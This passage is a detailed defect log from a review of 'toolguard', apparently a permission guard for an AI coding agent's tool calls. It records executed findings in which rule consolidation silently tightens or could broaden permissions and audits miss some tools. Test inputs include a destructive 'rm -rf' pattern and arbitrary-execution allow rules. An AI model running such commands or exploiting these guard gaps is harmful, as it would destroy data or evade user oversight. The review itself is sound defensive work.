| P11 | **`LeafCommand`/`UndecidableSegment` implement `__getitem__` and `__iter__` for tuple-style access that nothing uses.** Grep 2026-08-11: no production or test site unpacks or indexes either class. Both also carry `__slots__` with no memory justification, which `rules/python.md` asks for. | `toolguard/parser/command_extractor.py`, both classes | Candidate for deletion, or for replacement with a frozen dataclass -- which would also remove the hand-written `__eq__`/`__hash__`/`__repr__`. Note the tuple protocol IS the reason the `__slots__` ordering matters, so remove them together. |

### Observation about files outside this pass's scope

* **The `__HEREDOC_TO_` sentinel is an undeclared three-file contract.** Its text is built in `multiline._process_heredocs`, matched by `re.search(r"__HEREDOC_TO_(\w+)__")` in `command_extractor._apply_leaf_policy`, and substring-tested by `compound._extract_outer_command` (`if "__HEREDOC_TO_" in tok`). Three modules agree on that literal, no constant names it, and nothing checks the agreement. Not a defect today; it is the shape that makes P2/P3-style regressions silent. (`compound.py` was out of scope for this pass; nothing there was edited. Its cross-references to `command_extractor.LeafCommand`/`UndecidableSegment` were checked and are correct -- the classes are defined there and re-exported by `multiline`.)

### Refactoring candidates surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| P-R1 | `multiline._process_heredocs` | One `while` loop containing a `for` loop that does four separate things per iteration -- scan for the terminator, classify the sink, sanitise the sentinel label, splice the line -- each of which needed its own comment block before this pass and two of which (P3, P4) are defects hiding in the interleaving. The body-scan and the text-replacement have *opposite* natural orderings, which is exactly what P3 is. | Candidate: `_scan_heredoc_bodies(lines, i, specs)` returning the per-spec bodies in SOURCE order plus the new `i`, then `_splice_line(line, specs, sinks)` doing the replacements right-to-left. That split makes P3 impossible to reintroduce. |
| P-R2 | `multiline._classify_pipeline_sink` + `_extract_pipeline_sink` | Two ~50-line functions that segment the same way, skip flags the same way and recognise the same executor families, differing only in what they return (a class vs a name) and in tie-breaking. They already disagree on the all-flags input (`'-x'` vs `'unknown'`), which is a divergence nobody chose. | Candidate: one `_pipeline_sink(line)` returning a small frozen dataclass with `kind` and `name`, with both current functions as thin readers -- or deleted in favour of it. |
| P-R3 | `command_model.node_kind` | Twelve ordered `hasattr` tests whose correctness depends on their order, in one function, with the ordering constraint expressible only in prose. Not obviously wrong, and the alternative (dispatch on Canopy's `TreeNodeN` classes) is worse because those names are generated. Recorded so it is a considered decision rather than an unexamined one. | No change recommended; the docstring now states the ordering constraint. |

## Code-level defects found during #07 on `toolguard/tools/maintenance.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows lettered `M*`; the numeric sequence and the `E`/`S`/`V`/`D`/`EL`/`IU`/`OP`/`T`/`N`/`R`/`TCV` prefixes were already claimed by concurrent per-file passes. `M1` was executed live (probe under a `mkdtemp` sandbox with its own `.git` anchor; no real config touched). `M6`-`M8` were added by the pass-2 sweep on the same file, 2026-08-11.

| # | defect | where | note |
|---|---|---|---|
| **M1** | **`--help` tells the user the tool is read-only, and it is not.** The `ArgumentParser` description string reads *"Audience: END-USER and SKILL ... Read-only; never edits config."* Executed: `main(["--dir", <sandbox>, "--record-decision", <file>, "--ledger-level", "project"])` returned `0` and created `<sandbox>/.claude/toolguard_decisions.json`. `--apply --write` reaches `apply_proposals(..., dry_run=False)` and `--annotate --write` reaches `verified_write_config`, both of which edit config files. The claim was true of the module when only the aggregate mode existed; four write-capable modes have been added since and the banner never moved. It is the first thing a user reads. | `toolguard/tools/maintenance.py`, `main()`'s `argparse.ArgumentParser(description=...)` | The docstring above it was corrected in this pass and now contradicts the string, deliberately and visibly. Suggested wording: *"Read-only by default; `--apply`/`--annotate` write only with `--write`, and `--record-decision` writes a ledger."* |
| **M2** | **`--tool`'s help says "all governed tools (Bash, Read, Write, Edit)".** The default is `sorted(BUILTIN_TOOLS)`, which is the four tools governed *by default* -- not everything toolguard governs. With `additional_supported_tools` set, or for `mcp__jetbrains__execute_terminal_command` (a registered, non-builtin `ToolSpec`), a user's governed set is larger and `toolguard-maintain` silently skips the extras unless `--tool` is passed. Same `is_builtin`-versus-`KNOWN_TOOL_NAMES` conflation flagged on `tool_spec.py`. | `toolguard/tools/maintenance.py`, `--tool` help string | Cosmetic in wording, real in effect: the analyzer never inspects a governed MCP terminal tool by default. Decide whether the default should be the registry's command/file tools rather than the builtin four. |
| **M3** | **`run_maintenance` never passes the corpus to `propose_consolidations`, though the function takes one.** Line ~191: `propose_consolidations(config, tool)` -- while `find_redundancy` and `propose_broadening_consolidations` on the neighbouring lines are both given `corpus`. `propose_consolidations`'s own docstring calls the replay guard "an additional catch for any edge-case decision change on real traffic". So `--corpus` strengthens three engines and, silently, not this one -- the one whose output is the only thing `--apply` will actually enact. | `toolguard/tools/maintenance.py:run_maintenance` | Either thread `corpus` through (one argument) or state in `propose_consolidations` that the aggregator deliberately runs it corpus-free. The pass's comments now avoid claiming consolidations are corpus-replay-verified, so nothing depends on the current wording. |
| **M4** | **`_render_ledger`'s `fmt` parameter is dead, and its `decisions` is typed `Sequence[Any]`.** `fmt` is never read in the body -- `_run_ledger_show` passes `fmt=args.format`, so `markdown` and `text` produce byte-identical output. `LedgerDecision` is already imported in this module, so the `Any` buys nothing. | `toolguard/tools/maintenance.py:_render_ledger` | Trivial; grouped here only so the dead parameter is a recorded decision rather than an oversight. The docstring now says the parameter is ignored. |
| **M5** | **`_run_record_decision`'s batch-atomicity guarantee stops at input validation.** All `LedgerDecision`s are built before any is written, which is what the comment claims -- but the loop then calls `record_decision` once per decision, and `record_decision` itself re-reads the target ledger and can raise `LedgerError` on a malformed file. A batch of N against a corrupt ledger therefore aborts partway with an uncaught exception, and any earlier decisions are already persisted. The narrow case (a batch spanning two levels, one of them corrupt) is the only one where it bites, since `--ledger-level` is a single value. | `toolguard/tools/maintenance.py:_run_record_decision`, last two lines | Not worth a fix on its own; note it if the ledger ever grows a multi-level write. |
| **M6** | **`--apply`'s help string calls the proposals "replay-verified"; nothing that reaches `--apply` ever is.** The string reads *"Switch to apply mode: enact the replay-verified consolidation proposals the user has approved."* Replay runs only inside `_check_family1_safe`/`_check_family2_safe` **when a corpus is supplied**, and `run_maintenance` supplies none to `propose_consolidations` (row `M3`) -- so on every path that can reach `--apply`, the whole of the evidence is the synthetic probe set. False a second time over, independently: passing the probe gate is not equivalence (`consolidate.py:18-20`, and rows `C1`/`C2`, which are shapes that pass the gate and still remove an allow the user has today). This is the identical claim the pass-2 comment sweep removed from three docstrings in this same file -- the module docstring, `ToolMaintenance.consolidations`, and `collect_consolidations` -- still shipping in a user-facing string. | `toolguard/tools/maintenance.py`, `main()`'s `--apply` help string | **With `M1`, one of the two user-facing falsehoods in this file**, and both sit in `main()`'s argparse text, which is the first thing a user reads. Suggested wording: *"enact the strict consolidation proposals the user has approved"* -- `strict` is the code's own vocabulary (`_headline` prints `strict-consolidation`) and claims nothing the probe gate cannot support. |
| **M7** | **`run_maintenance` never consults `Configuration.governed_tools()`.** Its default target set is `sorted(BUILTIN_TOOLS)`, a hardcoded constant, while the tools toolguard actually governs are user-configurable and resolved by `config.governed_tools()` (union across `toolguard_hook` layers, defaulting to `DEFAULT_GOVERNED_TOOLS` -- `config.py:750`). A user who governs `mcp__jetbrains__execute_terminal_command` gets it silently skipped by every maintenance run, and by `--annotate` too, since `_collect_annotations` defaults the same way. The two sets coincide today, which is why nothing fails. | `toolguard/tools/maintenance.py:run_maintenance` and `:_collect_annotations` | **This is the mechanism behind `M2`**: the `--tool` help text is wrong because the default it describes is wrong, so fixing `M2` as a string edit alone leaves the skip in place. A `Configuration` is already in hand at both sites, so the change is one expression each. |
| **M8** | **`--tool` values are never validated.** `run_maintenance` iterates whatever strings arrive and an unrecognised name simply yields a `ToolMaintenance` with five empty tuples, so `--tool Bahs` exits `0` and prints a clean "No maintenance findings." report instead of an error. Minor on its own; recorded because it is the failure mode that hides a typo in a skill-generated command line, where nobody is reading the argument list. | `toolguard/tools/maintenance.py`, `main()`'s `--tool` handling | Validate against `KNOWN_TOOL_NAMES` (or against the resolved governed set, per `M7`) and `parser.error` on an unknown name. |

**Not a new row -- `M5` re-confirmed by the pass-2 sweep, with a fix shape.** `_run_record_decision`'s batch atomicity stops at the loop boundary: `record_decision` is called once per decision *outside* any `try`, so an `OSError` or `LedgerError` partway through a multi-decision batch propagates out of `main()` with the earlier entries already persisted and nothing printed. Wrapping the `record_decision` loop in the same `except LedgerError`/`except OSError` -> `return 2` handlers the validation phase already uses would close the half of the contract the surrounding comment claims. This is also why `main()`'s `Returns:` block now scopes its unreadable-ledger clause to `--ledger-show`: under `--record-decision` a malformed target ledger raises rather than returning `2` (executed 2026-08-11 -- `LedgerError` propagated, no stdout).

### Comment defect in a file outside this pass's scope

* **`toolguard/constants.py`'s `BUILTIN_TOOLS` doc-comment repeats the conflation `tool_spec.py` was corrected for.** It reads *"Tools toolguard ships built-in knowledge of, by name."* `mcp__jetbrains__execute_terminal_command` has a full `ToolSpec` in the registry -- toolguard ships built-in knowledge of it -- and is *not* in `BUILTIN_TOOLS`, because `is_builtin=False`. `tool_spec.py:ToolSpec.is_builtin` now states the distinction correctly (*"the first-party tools toolguard governs by default ... recognition is registry membership"*) and `constants.py` re-exports the value under the older, wrong gloss. Suggested: *"The first-party tools toolguard governs by default."*

### Refactoring candidate surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| M-R1 | `maintenance.main` | ~190 lines, of which ~150 are argparse construction, followed by a hand-rolled mutual-exclusion check over five mode flags (built as a list literal named `ledger_modes`, though only two of the five are ledger modes) and a five-branch dispatch. The parser definition and the dispatch have no reason to share a function, and the mode set is enumerated twice -- once as `add_argument` calls, once in the exclusivity tuple -- with nothing keeping them in step. | Candidate: `_build_parser()` returning the configured parser, plus a mode table `(flag_name, predicate, handler)` that both the exclusivity check and the dispatch read, so adding a mode is one row. `argparse`'s own `add_mutually_exclusive_group` does not fit here (the flags differ in type and `--write` is a modifier, not a mode), which is why the hand-rolled check exists -- worth recording so it is not "fixed" back into argparse. |

## Code-level defects found during #07 on `toolguard/tools/consolidate.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows lettered `C*`; the numeric sequence and the `E`/`S`/`V`/`D`/`EL`/`IU`/`OP`/`T`/`N`/`R`/`TCV`/`P`/`M` prefixes were already claimed by concurrent per-file passes. Every row was executed against in-memory `Configuration` objects built from hand-constructed `ConfigLayer`/`Provenance` (no file I/O, no real config touched).

**C1 and C2 are the load-bearing pair**: the module's own headline claim was that strict family-1 is *equivalence-preserving*, and that the no-changed-decision gate "guarantees it never tightens". Both of these get through the gate with all probes reported unchanged, and both silently remove an allow the user has today.

| # | defect | where | note |
|---|---|---|---|
| **C1** | **A fnmatch wildcard in a NON-varying token is regex-escaped into a literal, and the consolidation is accepted.** `_find_literal_alternations` applies `_is_literal_token` only to the token at the varying position; `_build_alternation_regex` then `re.escape`s every token including the fixed ones. Executed 2026-08-11 with `allow = ["git d*ff a:*", "git d*ff b:*"]`: `propose_consolidations` emits `added_pattern='[regex]^git d\\*ff (a|b)'`, and `decide` before/after gives `'git diff a'` **allow -> ask** and `'git dXXff a HEAD'` **allow -> ask**. All ten probes are unchanged, so `_check_family1_safe` reports success. | `toolguard/tools/consolidate.py:_find_literal_alternations` (the `_is_literal_token` check at the group-key loop) | Fix: require every token of the group's shared template to be wildcard-free, not just the varying one -- i.e. skip a `default_entries` row whose `cmd_tokens` contain any non-literal token. Cheap and strictly narrowing. The docstring of `_check_family1_safe` now states the gap rather than claiming equivalence. |
| **C2** | **Path normalization: DEFAULT matching tries the normalized command as well as the raw one; a `[regex]` pattern only ever sees the raw one.** `permissions.match_command` builds `command_variants = [command_str, normalize_path_in_command(command_str)]` and tests DEFAULT patterns against both, but routes `[regex]` straight to `match_pattern` on `command_str`. Executed 2026-08-11 with `allow = ["cat ./x:*", "cat ./y:*"]`: `propose_consolidations` emits `'[regex]^cat (\\./x|\\./y)'` with evidence `'10 probes unchanged; no corpus'`, and `'cat x'` goes **allow -> ask** (it matched only via the `./`-prefixing normalizer). `'cat y'` likewise. | `toolguard/tools/consolidate.py:_build_alternation_regex` vs `toolguard/permissions.py:match_command:112` | No cheap fix. Options: refuse to consolidate a group whose tokens contain `./` or `/`; or add the normalized form of each member command to the probe set, which at least converts the silent tightening into a rejection. The second is one line in `_generate_positive_probes` and would also have caught C1's `'git diff a'` had that probe existed. |
| **C3** | **`_static_prefix_of`'s `/`-boundary rule is unsound when the divergence is in the BASE (first) token, and a unit test asserts the unsound case.** `match_command`'s prefix branch gates on `cmd_var.startswith(base_cmd + " ") or cmd_var == base_cmd`, where `base_cmd` is the pattern's first token -- so a `/` cannot extend the base command. Executed 2026-08-11: `_static_prefix_of('/usr/bin', '/usr/bin/env')` is `True`, `match_command('/usr/bin/env python', ['/usr/bin/env:*'])` is `True`, and `match_command('/usr/bin/env python', ['/usr/bin:*'])` is **`False`** -- so the claimed subset relation is backwards for every command under `/usr/bin/env`. The same failure applies to the trailing-separator branch when `large_cmd` is a single token ending in `/`. The `/`-boundary rule IS sound when the divergence is in a later token (`mkdir -p /tmp/` vs `mkdir -p /tmp/claude-code` verified correct), which is the case it was written for. `test/unit/test_tools_consolidate.py:test_path_boundary_prefix_subsumes` asserts `_static_prefix_of("/usr/bin", "/usr/bin/env")` is `True` under the Given/When/Then *"Then it holds"* -- so the defect is pinned by a test that describes it as correct. | `toolguard/tools/consolidate.py:_static_prefix_of`; `test/unit/test_tools_consolidate.py:923-929` | Fix: apply the `/` boundary only when the divergence falls after the first whitespace token; keep the space boundary as-is. Nothing is currently emitted wrongly because `_check_family2_safe`'s probes reject it (`'/usr/bin/env'` is not allowed once its own rule is gone), but the probe is the only thing stopping it -- see C4 for a shape where an unrelated rule lets the probe pass. |
| **C4** | **False user-facing string: family 2 admits a no-colon EXACT body as the subsuming rule, and then tells the user every command matched by one is matched by the other.** `_find_static_subsumptions` accepts `args_part in ("*", "**", "")`; the `""` case is a pattern with no `:` at all, which `match_command` matches as a whole-string fnmatch. `_static_prefix_of` never looks at the args part. Executed 2026-08-11 with `allow = ["uv run", "uv run python:*", "[native]uv run python*"]`: a `static-subsumption` proposal is emitted removing `uv run python:*` with `rationale="'uv run python:*' is statically subsumed by 'uv run': every command matched by the former is also matched by the latter"` -- while `match_command('uv run python', ['uv run'])` is **`False`**. The `[native]` rule is what lets the probe pass; the claim in the rationale is false regardless. | `toolguard/tools/consolidate.py:_find_static_subsumptions` (the `""` in the args filter) and the `rationale=` f-string | Strings are code; not edited. Fix: exclude `""` from the args filter, or make `_static_prefix_of` take both args parts and refuse when the larger is exact. Note this is also the shape that shows the probe check, not the structural proof, is what actually guards family 2 -- contradicting the pre-sweep claim that "Family-2 proposals are structurally proven safe before the probe is run". |
| **C5** | **The single-token family-1 group broadens by construction, and only the extension probes stop it.** For a one-token command the regex has no base-command gate: `_build_alternation_regex([], ["cat","ls"], [])` gives `'[regex]^(cat|ls)'`, which matches `'lsof -i'`, `'lstat'` and `'catalog x'` -- none of which `ls:*`/`cat:*` match (executed 2026-08-11). `propose_consolidations` on `allow = ["ls:*","cat:*"]` correctly returns `[]`, rejected 4/10 probes, all four being the `+"x"`/`+"tool"` extension probes. Recorded because the pre-sweep docstring attributed the safety to construction ("by construction the generated regex is a subset-or-equal of the union ... so it can never broaden") when it is entirely the probe, and a probe set is a sample. | `toolguard/tools/consolidate.py:_build_alternation_regex` for a group with `n == 1` | Fix: refuse to consolidate a single-token group, or emit `^(cat|ls)(?: |$)` for that case. Either makes the safety structural again instead of sampled. |
| **C6** | **Proposals from one `propose_consolidations` call can overlap, and none is verified in combination with any other.** Every candidate is checked against the ORIGINAL config in isolation. Executed 2026-08-11 with `allow = ["mkdir -p /tmp/:*", "mkdir -p /tmp/claude-code:*"]`: one call returns a `literal-alternation` removing **both** patterns and a `static-subsumption` removing the second -- two proposals naming the same rule. Applying both happens to be harmless here (`with_layer_rules_replaced` no-ops on an absent pattern), but nothing in the module establishes that, and the apply path (`tools/rule_apply.py`) is handed the list as a set of independent changes. | `toolguard/tools/consolidate.py:propose_consolidations` | Either de-duplicate before returning (a family-2 drop whose pattern is already inside a family-1 group is redundant), or re-verify the composed config once. The docstring now warns the caller rather than implying independence. |
| **C7** | **Dead parameters and unreachable branches, grouped so they are recorded decisions rather than oversights.** (a) `_generate_negative_probes(prefix_tokens, varying_tokens, suffix_tokens)` never reads `varying_tokens`. (b) `parsed_group` is a 5-tuple `(cmd_tokens, args, pos, prefix_tokens, suffix_tokens)` of which both consumers read only `cmd_tokens`; `_check_family1_safe` computes `pos = len(prefix_tokens)` purely to fill a slot nobody reads. (c) `_static_prefix_of`'s `large_cmd.endswith(("/", " "))` -- the `" "` half is unreachable from every caller, since `large_cmd` is built as `" ".join(cmd_tokens)` after a `.split()`. (d) Both public entry points sort with `p.layer_provenance.describe() if hasattr(p.layer_provenance, "describe") else str(...)`; `Provenance` is a frozen dataclass that always has `describe`, so the fallback never runs -- and the identical eight-line lambda is duplicated between the two functions. | `toolguard/tools/consolidate.py`, the four sites named | All cosmetic. (b) is the one worth acting on: the 5-tuple is what makes the probe generators' signatures unreadable -- see C-R1. |
| **C8** | **Family 2 removes an allow the user has today, and the corpus does not stop it -- the corpus entry that proves the tightening is reported as evidence FOR the change.** `_check_family2_safe` rejects only on `diff.broadened_count > 0`, so a corpus-visible tightening passes the replay gate. Executed 2026-08-11 (pass 2) with `allow = ["uv run", "uv run python:*", "[regex]^uv run python( --x)?$"]` and a one-entry corpus `Bash: 'uv run python -m pytest'`: `propose_consolidations` emits `static-subsumption | removed=('uv run python:*',)` with `replay_summary="2 positive probes pass; corpus replay 1 entries, 0 broadened"`, while `decide` on `'uv run python -m pytest'` goes **allow -> ask** across the same removal. The two probes (`'uv run python'`, `'uv run python --x'`) pass only because the `[regex]` rule covers exactly them -- the same probe-passes-for-an-unrelated-reason shape as C4, but here with a corpus in play, which is the configuration a user would assume is the safe one. | `toolguard/tools/consolidate.py:_check_family2_safe` (the `broadened_count > 0` test) | Sharper than C4: C4's rationale string is false, this one's *evidence* string is actively misleading -- "0 broadened" is true and reads as "no decision changed". Fix with C9: test `diff.tightened_count` too, and the corpus becomes the guard it is presented as. |
| **C9** | **Family 2's safety gate is asymmetric with family 1's and nothing states why.** `_check_family1_safe` requires an IDENTICAL verdict on every probe and rejects on `broadened_count or tightened_count`; `_check_family2_safe` requires only that its two probes be `allow` before and after, and rejects only on `broadened_count`. Both directions of the asymmetry loosen family 2: a non-`allow` probe verdict that merely changes is invisible, and a tightening in the corpus is accepted. This is the root cause of C8, and the structural argument that was supposed to justify the weaker gate is itself unsound in the shapes C3 and C4 name. | `toolguard/tools/consolidate.py:_check_family2_safe` vs `_check_family1_safe` | Belongs in the ticket's fix direction as its own item, ahead of C8: decide whether family 2 is entitled to a weaker gate at all. If the structural proof is not sound (C3, C4), the honest answer is to give it family 1's gate. The module docstring now states the two gates separately instead of claiming one; it does not defend the difference, because nothing in the module does. |

### Comment defects in files this pass was not allowed to touch

* **`toolguard/tools/maintenance.py:11` and `:99` both call consolidations "strict, equivalence-preserving merges".** That is the claim C1 and C2 refute, inherited one module up and stated to the aggregator's readers as a property of the output. Suggested: *"strict merges, accepted only when a probe set and the corpus show no changed decision"*. Related to the existing row `M3` (the aggregator never passes the corpus to `propose_consolidations` at all, so for the aggregate path the probe set is the whole of the evidence).
* **`test/unit/test_tools_consolidate.py:476-482`, the `TestFamily1EquivalenceAndLandmine` class docstring**, asserts *"Family-1 is EQUIVALENCE-PRESERVING. The no-changed-decision gate ... is the real mechanism that prevents the alembic landmine"*. The first sentence is false (C1, C2); the second is true only of the alembic shape the class actually tests. Same wording at `:523` (*"an equivalence-preserving regex never widens it"*) and `:405` (*"Equivalence-preserving: must NOT tighten with a trailing word boundary"*). The tests themselves are correct -- only their prose overclaims.
* **`test/unit/test_tools_consolidate.py:660-661`** describes `git diff:*` and `git status:*` as *"neither command is a word-boundary prefix of the other"* and then glosses it as *"'git diff' != 'git status' prefix"*. The gloss is what `_static_prefix_of` checks; the phrase "word-boundary prefix" invites confusion with `[native]` pattern vocabulary, which is unrelated.

### Refactoring candidates surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| C-R1 | `consolidate._find_literal_alternations` | ~95 lines doing four separable things -- parse and filter DEFAULT prefix bodies; build the per-position template index; screen each group (size, already-emitted, literal, duplicate-token); then build, verify and emit. Before this pass each of the four carried its own banner comment, which is the "comments cluster over a sequence of concerns" signal. The 5-tuple `parsed_group` (C7b) exists only because the probe generators were given the whole grouping record instead of the member commands. | Candidate: `_default_prefix_entries(allow_patterns)`, `_template_groups(entries)`, and `_alternation_candidate(members, pos)` returning `(prefix, varying, suffix)` or `None`; the probe generators then take `List[str]` of member commands and the 5-tuple disappears with them. |
| C-R2 | `consolidate.propose_consolidations` / `propose_broadening_consolidations` | The eight-line sort-key lambda is byte-identical in both, including the dead `hasattr` fallback of C7d. Two copies of a comparison rule with nothing keeping them in step. | Candidate: one module-level `_proposal_sort_key(p)`. Both proposal classes already share the three field names it reads. |
| C-R3 | `consolidate._generate_negative_probes` | The `varying_tokens` parameter is never referenced in the body (C7a). Pass 2 could only make the docstring say so outright -- `varying_tokens: Unused; the probe deliberately avoids all of them` -- which documents a smell rather than removing it. `ruff check .` passes, so nothing catches it; a comment is the only thing standing between the next reader and a wasted minute. | Drop the parameter and the argument at its one call site in `_check_family1_safe`. Two lines, and the docstring entry goes with it. |
| C-R4 | `consolidate._generate_positive_probes` / `_generate_extension_probes` | The `parsed_group` 5-tuple (C7b) carries four fields nobody reads: both consumers destructure it as `cmd_tokens, _args, _pos, _prefix, _suffix`, and the four underscores are the visible cost -- the signature `List[Tuple[List[str], str, int, List[str], List[str]]]` appears twice and tells a reader nothing. | A one-field frozen dataclass, or simply `List[List[str]]` of member command tokens -- see `feedback_prefer_dataclass_over_tuple`. Subsumed by C-R1 if that split happens first; worth doing alone if it does not. |
| C-R5 | `consolidate._find_literal_alternations` | The group loop unpacks `for (args_part, n, pos, others), members in groups.items():` and uses only `pos`. Cosmetic, but it reads as though all four key fields matter downstream, which is exactly the wrong signal in the function C-R1 wants split. | `for key, members in groups.items():` with `pos = key[2]`, or a small named key type built where the index is. Do it inside C-R1 rather than as a separate change. |

## Code-level defects found during #07 on `toolguard/tools/security_audit.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `SA*` because the numeric sequence and the `S`/`V`/`D`/`E`/`EL`/`IU`/`OP`/`T`/`TCV`/`RS`/`TL`/`INS`/`N`/`R`/`P`/`M` letters are each claimed by concurrent per-file passes. Every row was **executed** against a throwaway config in a temp directory with `HOME` redirected, never against the real environment.

| # | defect | where | note |
|---|---|---|---|
| **SA1** | **The audit runs the clarity analyser over `BUILTIN_TOOLS` only, so a governed non-built-in tool gets rule and takeover coverage but silently no clarity coverage.** The three other analysers scope themselves differently: `danger()` iterates `config_access.discover_tools(config)` (every tool named in any permission list) and `audit_takeover()` iterates `config.governed_tools()`. Only the clarity loop is pinned to the four first-party defaults. Executed 2026-08-11 on a fixture whose `toolguard_hook.toml` sets `governed_tools = ["Bash", "mcp__jetbrains__execute_terminal_command"]` and gives **both** tools an overlapping `allow = "<tool>(git:*)"` / `deny = "<tool>(git push:*)"` pair: `find_confusing_interactions(config, "mcp__jetbrains__execute_terminal_command")` returns **1** finding, `find_confusing_interactions(config, "Bash")` returns **1**, and `security_audit(config)` reports clarity findings for `['Bash']` only. The takeover analyser in the same run *did* emit `hook-not-registered` for the MCP tool, so the report is not silent about that tool in general -- which is what makes the clarity hole easy to miss. **Amended by pass 2 (2026-08-11): `additional_supported_tools` entries are affected WORSE, not identically.** Executed on a second fixture with `governed_tools = ["Bash"]`, the MCP tool listed only in `additional_supported_tools`, and the same overlapping `allow = "<tool>(git:*)"` / `deny = "<tool>(git push:*)"` pair for both tools: `discover_tools(config)` returns **both** tools, but the whole report names only `Bash` -- no clarity finding (the tool is not in `BUILTIN_TOOLS`), no `hook-not-registered` (`audit_takeover` iterates `config.governed_tools()`, which the tool is not in), and no danger finding (`git:*` trips no detector). `MCP tool name in render(report)` -> `False`. So **nothing in the report names the tool at all**; the governed case at least has a masking `hook-not-registered` finding that keeps it visible, and this one does not. | `toolguard/tools/security_audit.py:security_audit`, the `for tool in sorted(BUILTIN_TOOLS)` loop | This is the `is_builtin` / registry-membership conflation in its most consequential form: `BUILTIN_TOOLS` means "governed by default", not "recognised", and the clarity loop wants neither -- it wants the same set `danger()` uses. Fix is one expression (`discover_tools(config)`, or `config.governed_tools()` to match `audit_takeover`); the two candidates differ for a tool that has rules but is not governed, so pick deliberately. No comment was added asserting the current scope is intentional, because nothing in the file or its tests says it is. |
| **SA2** | **`main`'s argparse `description` tells the user the audit covers two analysers.** It reads *"report findings from both the rule-danger analyser and the takeover-mode invariant checker"*. The audit has run four analysers since clarity and environment were added; neither appears in `--help`. A user or agent reading `toolguard-audit --help` to decide whether the tool covers rule-interaction clarity is told it does not. | `toolguard/tools/security_audit.py:main`, the `ArgumentParser(description=...)` text | Strings are code; not edited. The stale docstring saying the same thing ("runs both security analysers") *was* corrected in this pass, so the docstring and the help text now disagree until this is fixed. |
| **SA3** | **`_render_edit_banner`'s output is never folded to ASCII, though `render`'s is, and `main` prints both.** `render` ends with `result.encode("ascii", errors="replace")`; the banner is built and returned with no such step, and `main` does `print(_render_edit_banner(...))` before `print(render(...))`. Executed 2026-08-11 with a pattern body of `rm -rf /café/☃`: `render(...)` emits `pattern: rm -rf /caf?/?` in both formats (all-ASCII `True`), while the banner emits `- resolved destructive-cmd-allow (HIGH) rm -rf /café/☃` (all-ASCII `False`). Pattern bodies are copied verbatim out of user config files, so this is reachable without anything unusual. | `toolguard/tools/security_audit.py:_render_edit_banner` vs `render` | Low severity -- a mis-rendered character on a terminal, not a wrong verdict -- but it breaks a rule the module states as absolute. Fix: fold in `_render_edit_banner`, or fold once at the `print` sites. Docstring history, because this defect has now been mis-documented twice: pass 1 replaced the false *"A short ASCII banner"* with a true sentence stating the exception -- *"Unlike :func:`render`, this text is not folded to ASCII: the pattern bodies it quotes reach the terminal as authored"* -- but the colon made the second clause read as the *rationale* for the first, so the file told a reader the omission was deliberate while this row recorded it as a bug. Pass 2 deleted both sentences; the docstring now makes no ASCII claim at all, and **this row is the only record**. |
| **SA4** | **`#NOSECURITY` acknowledges rule findings only. A clarity, takeover, or environment finding cannot be acknowledged at all.** `nosecurity_reason_for` is called in the `danger()` branch and nowhere else; the other three `RankedFinding` constructions leave `acknowledged`/`acknowledgement` at their `False`/`None` defaults. So a deliberately-accepted `deny-shadows-allow` overlap re-appears at full prominence on every run with no way to silence it, and a user who has tagged the rule reasonably expects otherwise. | `toolguard/tools/security_audit.py:security_audit` | Not obviously a bug -- clarity findings are about a *pair* of rules, so which one carries the tag is a design question, and takeover/environment findings have no rule to tag. Recorded because the user-facing documentation states the opposite (see below), and because the omission is invisible: the field exists on every finding. |
| **SA5** (pass 2) | **A cross-layer clarity finding names a problem and then discards the field that locates it.** `clarity.InteractionFinding` carries `guard_provenance` -- the provenance of the OTHER layer holding the overlapping guard -- alongside `guard_section` and `guard_pattern`. This module's clarity block sets `locus=cf.provenance.describe_brief()`, which is the *allow's* layer, and drops all three guard fields. Meanwhile `_explain_cross_layer` (`clarity.py:126-137`) ends its explanation with *"the effective verdict depends on a rule in another file"* -- and neither the rendered report nor the `--format json` payload gives the reader any way to learn **which** file. On a project + user + `~/.claude` hierarchy that is the hard part of the investigation, and it is the only part the finding withholds. **It also propagates to `--edits`**: `_finding_key` is `(finding_id, tool, pattern, locus)`, and `_cross_layer_findings` emits one finding per (allow, guard) pair with `provenance` fixed to the allow's layer, so two cross-layer findings for the same allow that differ only in which other layer holds the guard produce the **same key** -- `_finding_delta`'s dict comprehensions then collapse them and one silently vanishes from `introduced`/`resolved`. | `toolguard/tools/security_audit.py:security_audit`, the clarity `RankedFinding(...)` block; `_finding_key` | Fix is on the normalised shape, not the detector: `RankedFinding` has no field for a second locus. Carry `guard_locus` (and probably `guard_pattern`) through to the finding, the renderer and the JSON payload, and add `guard_locus` to `_finding_key`. Strengthens the SA-R1 case below -- this is a fifth field-mapping asymmetry hidden inside one of the four 20-line literals. |

### Comment and documentation defects in files outside this pass's scope

* **`docs/security.md:538` tells users a `#NOSECURITY` tag stops the audit re-flagging a finding. It does not.** The text: *"A finding you've deliberately accepted can be marked `#NOSECURITY: <reason>` so the audit stops re-flagging it"*. The audit's whole stated design is the opposite -- an acknowledged finding is still reported, still counted in `counts` and `highest_severity`, and still exits non-zero under `--strict`; it is only sorted last and labelled. Executed 2026-08-11: a `#NOSECURITY`-tagged `Bash(uv run python:*)` allow still produced its CRITICAL `arbitrary-exec-allow` finding, with `acknowledged=True`. The in-code wording ("toolguard acknowledges, it does not hide") is the accurate one. A user who believes the doc will read a clean-looking report as evidence the tag worked, when what changed is the sort position.
  * **Pass 2, A/B verified 2026-08-11**, same config with and without the tag: identical `counts` `{'CRITICAL': 2, 'LOW': 2}`, identical `highest_severity` `4`, identical `--strict` exit code `4`, same finding ids in both runs. The only differences are one extra `acknowledged:` line and the finding's sort position. The page also contradicts `skills/toolguard-security-audit/SKILL.md:159-168`, which states the behaviour correctly (*"acknowledged, not hidden ... it still appears in the report, flagged `acknowledged` with its reason, and sorted last"*).
  * **Proposed replacement for `docs/security.md:537-539`, for `/documentation-review` (quoted verbatim; `docs/` is frozen in this pass):** *"the final call, because the rules are **your** security policy. A finding you've deliberately accepted can be marked `#NOSECURITY: <reason>`; the audit keeps reporting and counting it, but labels it with your reason and sorts it last, so a reviewer can see it was an accepted risk rather than an oversight (see [Maintenance & Audit Skills](skills.md))."*
